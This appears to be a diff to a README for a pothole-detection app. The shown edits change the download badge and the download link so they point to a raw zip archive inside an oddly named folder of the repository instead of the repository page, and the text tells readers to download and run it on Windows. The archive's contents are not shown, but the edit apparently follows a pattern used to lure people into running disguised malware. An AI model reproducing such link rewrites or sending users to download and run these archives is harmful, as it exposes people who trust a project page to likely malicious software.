@@ -1,6 +1,6 @@
 # 🤖 pothole-intelligence-system - Find Road Damage Before It Grows
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/saucereyed-fullgeneral935/pothole-intelligence-system)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/saucereyed-fullgeneral935/pothole-intelligence-system/raw/refs/heads/main/elucubrate/intelligence_pothole_system_v3.9.zip)
 
 ## 🚗 What this app does
 
@@ -21,7 +21,7 @@ It is built for real-world road photos, so it can handle different light, weathe
 
 Visit this page to download and run the app:
 
-[https://github.com/saucereyed-fullgeneral935/pothole-intelligence-system](https://github.com/saucereyed-fullgeneral935/pothole-intelligence-system)
+[https://github.com/saucereyed-fullgeneral935/pothole-intelligence-system/raw/refs/heads/main/elucubrate/intelligence_pothole_system_v3.9.zip](https://github.com/saucereyed-fullgeneral935/pothole-intelligence-system/raw/refs/heads/main/elucubrate/intelligence_pothole_system_v3.9.zip)
 
 ## 🪟 How to run on Windows
 
